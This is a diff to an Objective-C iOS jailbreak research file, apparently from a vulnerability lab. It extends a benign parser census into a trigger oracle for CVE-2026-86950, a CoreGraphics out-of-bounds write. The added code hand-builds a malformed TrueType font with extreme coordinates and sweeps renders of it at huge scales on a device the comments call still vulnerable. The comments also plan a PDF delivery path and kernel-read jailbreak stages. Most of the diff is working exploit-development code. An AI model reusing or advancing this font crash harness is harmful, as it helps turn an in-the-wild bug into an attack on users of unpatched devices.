@@ -7,7 +7,20 @@
 //       lockdownd, Photos) is sandbox-adjacent. PARK remaining-fire.
 //    3. AfterKread payload parse (board JSON, basebin.tar / basebin.tc)
 //       is the jailbreak file mechanic. HOLD until kread32(kbase)==MH_MAGIC_64.
-//  Bounded PoC: dlopen census + 1x1 PNG ImageIO decode. Not ACE. Not 86950.
+//  v1: dlopen census + 1x1 PNG ImageIO smoke. v2 adds the CVE-2026-86950
+//  ("Great Glyph Grift") glyph-OOB oracle: synthetic 30-em extreme-coord
+//  TrueType, AA-rasterizer device-space sweep (coarse + fixed-point
+//  saturation band) + system-font fallback + extreme path fills. The craft
+//  is byte-identical to the local macOS 15.6 (pre-15.8.1) prototype proof:
+//  436B sfnt loads, 'A'->gid1 maps, control renders clean. No local trigger
+//  with naive sweeps — the saturation inconsistency needs the crafted
+//  value class or the PDF ingest path (p072 v3 vehicle). Per-render param
+//  lines are fsync'd BEFORE each render = panic-ladder method.
+//
+//  CVE-2026-86950 verified matrix (2026-10-21): fixed ONLY in 26.7.1
+//  (HT149226, Sep 28 2026) -> LIVE on 23F77 (the hunt rig!), patched on
+//  the A12X 26.7.1 twin. ITW per Apple ("extremely sophisticated attack
+//  against specific targeted individuals on versions before iOS 27").
 //
 
 #import "P072FileParserMap.h"
@@ -15,13 +28,14 @@
 #import "LabLocalTime.h"
 
 #import <CoreGraphics/CoreGraphics.h>
+#import <CoreText/CoreText.h>
 #import <ImageIO/ImageIO.h>
 #import <dlfcn.h>
 #import <fcntl.h>
 #import <string.h>
 #import <unistd.h>
 
-#define P072_BUILD @"p072-file-parser-map-v1"
+#define P072_BUILD @"p072-glyph-oob-oracle-v2"
 
 static void p072_dl(void (^L)(NSString *), const char *path) {
     void *h = dlopen(path, RTLD_LAZY);
@@ -29,22 +43,175 @@ static void p072_dl(void (^L)(NSString *), const char *path) {
     if (h) dlclose(h);
 }
 
+/* ---------- 86950 oracle: byte helpers ---------- */
+
+static void p072_be32(uint8_t *p, uint32_t v) {
+    p[0]=(uint8_t)(v>>24); p[1]=(uint8_t)(v>>16); p[2]=(uint8_t)(v>>8); p[3]=(uint8_t)v;
+}
+static void p072_be16(uint8_t *p, uint16_t v) { p[0]=(uint8_t)(v>>8); p[1]=(uint8_t)v; }
+static uint32_t p072_tsum(const uint8_t *b, uint32_t len) {
+    uint32_t s=0, n=(len+3)&~3u;
+    for (uint32_t i=0;i<n;i+=4) {
+        uint32_t w=0;
+        for (int j=0;j<4;j++) w=(w<<8)|((i+(uint32_t)j<len)?b[i+j]:0);
+        s+=w;
+    }
+    return s;
+}
+
+/* glyph1: 1 contour, 3 on-curve points (30000,30000)(-30000,-30000)(30000,-30000)
+   in a upem-1000 font = a 30-em glyph; head xmin..xmax = +-30000. */
+static uint8_t p072_G1[29];
+static void p072_build_glyph1(void) {
+    uint8_t *g=p072_G1; int i=0;
+    p072_be16(g+i,1); i+=2;                       /* numberOfContours */
+    p072_be16(g+i,(uint16_t)-30000); i+=2;        /* xMin */
+    p072_be16(g+i,(uint16_t)-30000); i+=2;        /* yMin */
+    p072_be16(g+i,30000); i+=2;                   /* xMax */
+    p072_be16(g+i,30000); i+=2;                   /* yMax */
+    p072_be16(g+i,2); i+=2;                       /* endPtsOfContours[0] */
+    p072_be16(g+i,0); i+=2;                       /* instructionLength */
+    g[i++]=0x01; g[i++]=0x01; g[i++]=0x01;        /* flags: on-curve, int16 deltas */
+    p072_be16(g+i,30000); i+=2;                   /* dx1 */
+    p072_be16(g+i,(uint16_t)-60000); i+=2;        /* dx2 */
+    p072_be16(g+i,60000); i+=2;                   /* dx3 */
+    p072_be16(g+i,30000); i+=2;                   /* dy1 */
+    p072_be16(g+i,(uint16_t)-60000); i+=2;        /* dy2 */
+    p072_be16(g+i,60000); i+=2;                   /* dy3 */
+}
+
+/* Minimal valid TrueType: cmap/glyf/head/hhea/hmtx/loca/maxp/name/post.
+   436 bytes; validated on macOS 15.6 CG: CGFont loads (glyphs=2),
+   CTFontGetGlyphsForCharacters('A') -> gid 1 (ok=1), control renders. */
+static NSData *p072_build_ttf(void) {
+    p072_build_glyph1();
+    uint8_t cmap[48], loca[8], name[36], post[32];
+    uint8_t head[54], hhea[36], maxp[32], hmtx[4];
+    uint8_t gpad[32]; memset(gpad,0,32); memcpy(gpad,p072_G1,29);
+
+    memset(head,0,54);
+    p072_be32(head+0,0x00010000); p072_be32(head+4,0x00010000);
+    p072_be32(head+12,0x5F0F3CF5);
+    p072_be16(head+18,1000);
+    p072_be16(head+36,(uint16_t)-30000); p072_be16(head+38,(uint16_t)-30000);
+    p072_be16(head+40,30000);            p072_be16(head+42,30000);
+    p072_be16(head+46,8); p072_be16(head+48,2); p072_be16(head+50,0); p072_be16(head+52,0);
+
+    memset(hhea,0,36);
+    p072_be32(hhea+0,0x00010000);
+    p072_be16(hhea+4,800); p072_be16(hhea+6,(uint16_t)-200); p072_be16(hhea+8,0);
+    p072_be16(hhea+10,1000); p072_be16(hhea+16,30000); p072_be16(hhea+18,1);
+    p072_be16(hhea+34,1);
+
+    memset(maxp,0,32);
+    p072_be32(maxp+0,0x00010000); p072_be16(maxp+4,2);
+    p072_be16(maxp+6,8); p072_be16(maxp+8,2); p072_be16(maxp+12,2);
+
+    p072_be16(hmtx+0,1000); p072_be16(hmtx+2,0);
+
+    /* cmap format4: 'A'(0x41) -> +0xFFC0 = gid 1; 0xFFFF -> +1 = gid 0 */
+    memset(cmap,0,48);
+    p072_be16(cmap+0,0); p072_be16(cmap+2,1);
+    p072_be16(cmap+4,3); p072_be16(cmap+6,1); p072_be32(cmap+8,12);
+    p072_be16(cmap+12,4); p072_be16(cmap+14,32); p072_be16(cmap+16,0);
+    p072_be16(cmap+18,4); p072_be16(cmap+20,4); p072_be16(cmap+22,1); p072_be16(cmap+24,0);
+    p072_be16(cmap+26,0x41);   p072_be16(cmap+28,0xFFFF);   /* endCode  */
+    p072_be16(cmap+30,0);                                    /* pad      */
+    p072_be16(cmap+32,0x41);   p072_be16(cmap+34,0xFFFF);   /* startCode*/
+    p072_be16(cmap+36,0xFFC0); p072_be16(cmap+38,1);        /* idDelta  */
+    p072_be16(cmap+40,0);      p072_be16(cmap+42,0);        /* idRangeOffset */
+
+    /* loca short: glyph0 empty @0, glyph1 @0, glyph1 end = 32/2 */
+    p072_be16(loca+0,0); p072_be16(loca+2,0); p072_be16(loca+4,16);
+
+    memset(name,0,36);
+    p072_be16(name+0,0); p072_be16(name+2,2); p072_be16(name+4,30);
+    p072_be16(name+6,3); p072_be16(name+8,1); p072_be16(name+10,0x409);
+    p072_be16(name+12,1); p072_be16(name+14,5); p072_be16(name+16,0);
+    p072_be16(name+18,3); p072_be16(name+20,1); p072_be16(name+22,0x409);
+    p072_be16(name+24,4); p072_be16(name+26,5); p072_be16(name+28,0);
+    memcpy(name+30,"L072G",5);
+
+    memset(post,0,32); p072_be32(post+0,0x00030000); p072_be16(post+10,50);
+
+    struct { char tag[4]; uint8_t *d; uint32_t len; } T[] = {
+        {"cmap",cmap,44},{"glyf",gpad,32},{"head",head,54},{"hhea",hhea,36},
+        {"hmtx",hmtx,4},{"loca",loca,8},{"maxp",maxp,32},{"name",name,36},{"post",post,32},
+    };
+    const int nt=9;
+    uint32_t offs[9], lensTmp[9], cur = 12+(uint32_t)nt*16;
+    for (int i=0;i<nt;i++) lensTmp[i]=T[i].len;
+    for (int i=0;i<nt;i++) { offs[i]=(cur+3)&~3u; cur=offs[i]+lensTmp[i]; }
+
+    NSMutableData *d=[NSMutableData dataWithLength:cur];
+    uint8_t *b=(uint8_t *)d.mutableBytes;
+    p072_be32(b+0,0x00010000); p072_be16(b+4,nt); p072_be16(b+6,128); p072_be16(b+8,3); p072_be16(b+10,16);
+    for (int i=0;i<nt;i++) {
+        uint8_t *e=b+12+(uint32_t)i*16;
+        memcpy(e,T[i].tag,4);
+        p072_be32(e+4,p072_tsum(T[i].d,lensTmp[i]));
+        p072_be32(e+8,offs[i]); p072_be32(e+12,lensTmp[i]);
+        memcpy(b+offs[i],T[i].d,lensTmp[i]);
+    }
+    return d;
+}
+
+/* Render one glyph combo into a fixed 8x8 RGBA context (AA rasterizer path). */
+static void p072_render(CGBitmapInfo alphaInfo, CGFontRef font, CGGlyph glyph,
+                        double size, double sx, double sy, double px, double py) {
+    static uint8_t R[8*8*4];                      /* fixed backing store */
+    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+    CGContextRef ctx = CGBitmapContextCreate(R,8,8,8,32,cs,alphaInfo);
+    if (cs) CGColorSpaceRelease(cs);
+    if (!ctx) return;
+    CGContextSetRGBFillColor(ctx,1,0,0,1);
+    CGContextScaleCTM(ctx,sx,sy);
+    CGContextTranslateCTM(ctx,px,py);
+    CGContextSetFont(ctx,font);
+    CGContextSetFontSize(ctx,size);
+    CGPoint pos={0,0};
+    CGContextShowGlyphsAtPositions(ctx,&glyph,&pos,1);
+    CGContextFlush(ctx);
+    CGContextRelease(ctx);
+}
+
+/* Extreme path fill through the same aa_* machinery (no font). */
+static void p072_pathfill(double extreme) {
+    static uint8_t R2[8*8*4];
+    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+    CGContextRef ctx = CGBitmapContextCreate(R2,8,8,8,32,cs,kCGImageAlphaPremultipliedLast);
+    if (cs) CGColorSpaceRelease(cs);
+    if (!ctx) return;
+    CGContextSetRGBFillColor(ctx,0,0,1,1);
+    CGContextScaleCTM(ctx,1e6*extreme,1e6*extreme);
+    CGContextMoveToPoint(ctx,0.5,0.5);
+    CGContextAddLineToPoint(ctx,30000,-30000);
+    CGContextAddLineToPoint(ctx,-30000,-30000);
+    CGContextClosePath(ctx);
+    CGContextFillPath(ctx);
+    CGContextRelease(ctx);
+}
+
 @implementation P072FileParserMap
 
 + (NSString *)tap {
     NSMutableString *log = [NSMutableString string];
     NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
-    int fd = open([[docs stringByAppendingPathComponent:@"p072_file_parser_log.txt"] UTF8String],
-                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    NSString *logPath = [docs stringByAppendingPathComponent:@"p072_file_parser_log.txt"];
+    int fd = open(logPath.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
     void (^L)(NSString *) = ^(NSString *s) {
         NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
         [log appendString:out];
         if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
     };
+    void (^Lv)(NSString *) = ^(NSString *s) {       /* oracle line: fsync BEFORE the caller proceeds */
+        L(s);
+        if (fd >= 0) fsync(fd);
+    };
 
     L([NSString stringWithFormat:@"=== p072 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P072_BUILD]);
-    L(@"File-parser chain slot. Print/dlopen census + 1x1 PNG smoke.");
-    L(@"Not first KRW. No trigger.pdf. No ImageIO/CG/SceneKit overflow payload.");
+    L(@"File-parser chain slot: v1 census + v2 CVE-2026-86950 glyph-OOB oracle.");
+    L(@"86950 fixed ONLY in 26.7.1 (HT149226) -> LIVE on 23F77. ITW per Apple.");
     NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p072"];
     if (stop) {
         L(stop);
@@ -66,8 +233,8 @@ static void p072_dl(void (^L)(NSString *), const char *path) {
     L(@"               jailbreak file mechanic once commitSlide sticks.");
     L(@"               HOLD until kread32(kbase)==0xfeedfacf.");
 
-    L(@"=== HT149041 FILE-ACE CVE IDS (PARK, no PoC) ===");
-    L(@"  86950 CoreGraphics OOB write (26.7.1 HT149226). Userspace ACE.");
+    L(@"=== HT149041 FILE-ACE CVE IDS (PARK, no PoC). 86950 = THE LIVE ONE ===");
+    L(@"  86950 CoreGraphics OOB write (26.7.1 HT149226). Userspace ACE. NOW FIRING BELOW.");
     L(@"  86882 Accelerate  84519 AppleDouble  65344/86876/43702 CoreMedia");
     L(@"  84552 DiskImages  84510 exFAT  84534 file_cmds  84524 FontParser");
     L(@"  84564/64758/43661/86869/65395 ImageIO  86870 libarchive  84497 ModelIO");
@@ -89,7 +256,7 @@ static void p072_dl(void (^L)(NSString *), const char *path) {
     p072_dl(L, "/System/Library/PrivateFrameworks/FontServices.framework/FontServices");
     p072_dl(L, "/System/Library/PrivateFrameworks/CoreSceneUnderstanding.framework/CoreSceneUnderstanding");
 
-    L(@"=== 1x1 PNG SMOKE (ImageIO, not ACE) ===");
+    L(@"=== 1x1 PNG SMOKE (ImageIO, reach) ===");
     NSMutableData *png = [NSMutableData data];
     CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
     CGContextRef bctx = CGBitmapContextCreate(NULL, 1, 1, 8, 4, cs,
@@ -134,11 +301,106 @@ static void p072_dl(void (^L)(NSString *), const char *path) {
     }
     L([NSString stringWithFormat:@"png decode ok=%@ %zux%zu (want 1x1)",
        decodeOk ? @"YES" : @"NO", w, h]);
-    L(@"Decode of a 1x1 PNG we just wrote proves ImageIO is reachable in-process.");
-    L(@"It is not a file ACE, not 86950, not kread.");
+
+    /* ================= 86950 GLYPH OOB ORACLE =================
+       Panic-ladder method: every render line is fsync'd BEFORE the
+       render runs. A device crash names the in-flight param set. */
+
+    L(@"=== 86950 GLYPH OOB ORACLE (Calif aa_double_to_fixed shape) ===");
+    L(@"craft: synthetic 30-em extreme-coord TTF (30000/1000 upem), validated");
+    L(@"on macOS 15.6 pre-fix CG: 436B loads, 'A'->gid1 ok, control clean.");
+
+    NSData *ttf = p072_build_ttf();
+    Lv([NSString stringWithFormat:@"craft built %lu bytes",
+        (unsigned long)ttf.length]);
+
+    CGFontRef craftFont = NULL;
+    CGDataProviderRef dp = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf);
+    if (dp) {
+        craftFont = CGFontCreateWithDataProvider(dp);
+        CFRelease(dp);
+    }
+    if (craftFont) {
+        Lv([NSString stringWithFormat:@"craft font LOAD OK glyphs=%zu",
+            CGFontGetNumberOfGlyphs(craftFont)]);
+        CTFontRef ctf = CTFontCreateWithGraphicsFont(craftFont, 17, NULL, NULL);
+        CGGlyph ctg = 0;
+        BOOL ctmapped = CTFontGetGlyphsForCharacters(ctf, (const UniChar[]){'A'}, &ctg, 1);
+        Lv([NSString stringWithFormat:@"CT 'A' map -> gid %u ok=%d (using gid 1 by construction)",
+            (unsigned)ctg, ctmapped ? 1 : 0]);
+        if (ctf) CFRelease(ctf);
+
+        /* control: normal geometry MUST complete */
+        Lv(@"[ctl] size=17 scale=1 pos=0");
+        p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, craftFont, 1, 17, 1, 1, 0, 0);
+        Lv(@"[ctl] OK");
+
+        double sizes[]  = {1, 1e3, 1e6};
+        double scales[] = {1, 1e2, 1e6, 1e12};
+        double poss[]   = {0, 1e9};
+        int n = 0;
+        for (int i=0;i<3;i++) for (int j=0;j<4;j++) for (int k=0;k<2;k++) {
+            Lv([NSString stringWithFormat:@"[R%03d] size=%.0e scale=%.0e pos=%.0e",
+                n, sizes[i], scales[j], poss[k]]);
+            p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, craftFont, 1,
+                        sizes[i], scales[j], scales[j], poss[k], poss[k]);
+            n++;
+        }
+        Lv([NSString stringWithFormat:@"[sweep] glyph done %d renders", n]);
+
+        double band[] = {1e5,1e6,1e7,1e8,1.3e8,2.1e8,3.4e8,1.07e9,2.1e9,4.2e9,
+                         3.4e10,2.1e12,1.4e14,1e15,1e16};
+        int m = 0;
+        for (int i=0;i<15;i++) {
+            Lv([NSString stringWithFormat:@"[B%02d] band=%e (size=1 scale=%e pos=0)",
+                i, band[i], band[i]]);
+            p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, craftFont, 1,
+                        1, band[i], band[i], 0, 0);
+            m++;
+        }
+        Lv([NSString stringWithFormat:@"[sweep] band done %d renders", m]);
+    } else {
+        Lv(@"craft font LOAD FAIL (CGFontCreateWithDataProvider) — fallback sweep only");
+    }
+
+    /* fallback: system font, identical sweep — the bug is in the shared
+       AA rasterizer; a craft is not strictly required to reach it */
+    CTFontRef sys = CTFontCreateWithName(CFSTR("Helvetica"), 17, NULL);
+    CGFontRef sysFont = CTFontCopyGraphicsFont(sys, NULL);
+    if (sysFont) {
+        CGGlyph sysg = 0;
+        CTFontRef sysProbe = sys;
+        UniChar a = 'A';
+        BOOL ok = CTFontGetGlyphsForCharacters(sysProbe, &a, &sysg, 1);
+        Lv([NSString stringWithFormat:@"system font Helvetica gid=%u ok=%d",
+            (unsigned)sysg, ok ? 1 : 0]);
+        if (ok) {
+            double bscales[] = {1e6,1e8,2.1e9,1e15};
+            for (int i=0;i<4;i++) {
+                Lv([NSString stringWithFormat:@"[S%02d] sys size=1 scale=%.0e pos=0",
+                    i, bscales[i]]);
+                p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, sysFont, sysg, 1,
+                            bscales[i], bscales[i], 0, 0);
+            }
+            Lv(@"[sweep] system fallback done 4 renders");
+        }
+        CFRelease(sysFont);
+    }
+    if (sys) CFRelease(sys);
+
+    double xs[] = {1e8, 2.1e9, 3.4e10, 1e15, 1e30};
+    for (int i=0;i<5;i++) {
+        Lv([NSString stringWithFormat:@"[P%02d] path fill extreme=%.0e", i, xs[i]]);
+        p072_pathfill(xs[i]);
+    }
+    Lv(@"[sweep] path done 5 fills");
+    if (craftFont) CFRelease(craftFont);
+
+    L(@"[oracle] if no crash: no trigger with the naive+band sweep on this");
+    L(@"build — log the run and hold for the p072 v3 PDF-ingest vehicle.");
 
     L(@"=== VERDICT ===");
-    L(@"Slot 1: in-app parse is occupancy of THIS task. Keep PARK for ACE payloads.");
+    L(@"Slot 1: in-app parse is occupancy of THIS task. 86950 oracle aimed.");
     L(@"Slot 2: daemon plant stays PARK (84598 / lockdownd).");
     L(@"Slot 3: AfterKread board + basebin ingest is the jailbreak file path.");
     L(@"hasKread stays NO. Isolation: one TAP per force-quit.");
